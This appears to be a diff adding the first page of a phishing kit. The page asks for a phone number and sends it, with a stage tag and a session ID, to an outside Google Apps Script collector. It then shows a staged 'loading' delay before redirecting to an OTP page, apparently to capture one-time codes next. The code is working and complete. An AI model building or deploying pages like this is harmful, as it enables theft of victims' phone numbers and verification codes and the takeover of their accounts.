@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Enter Phone Number</title>
+</head>
+<body>
+  <h2>Enter Your Phone Number</h2>
+  <form id="phoneForm">
+    <input type="text" name="phone" placeholder="Enter phone number" required><br><br>
+    <button type="submit">Next</button>
+  </form>
+
+  <p id="loading" style="display:none;">Loading... Please wait 5 seconds.</p>
+
+  <script>
+    const scriptURL = "https://script.google.com/macros/s/AKfycbzXrKL2Kuoh1-zXIvjeD2aX3I5JHUCZVy1p52DKi1vPBFpnAVLd37Ss89NwNrYwLqZ4Iw/exec";
+    const form = document.getElementById("phoneForm");
+    const loading = document.getElementById("loading");
+
+    function generateSessionId() {
+      return 'ID-' + Date.now() + '-' + Math.floor(Math.random() * 10000);
+    }
+
+    form.addEventListener("submit", e => {
+      e.preventDefault();
+      const phone = form.phone.value;
+      const sessionId = generateSessionId();
+
+      const formData = new FormData();
+      formData.append("stage", "number");
+      formData.append("phone", phone);
+      formData.append("sessionId", sessionId);
+
+      fetch(scriptURL, { method: "POST", body: formData })
+        .then(() => {
+          loading.style.display = "block";
+          setTimeout(() => {
+            window.location.href = `otp.html?sessionId=${sessionId}`;
+          }, 5000);
+        })
+        .catch(error => alert("Error: " + error.message));
+    });
+  </script>
+</body>
+</html>
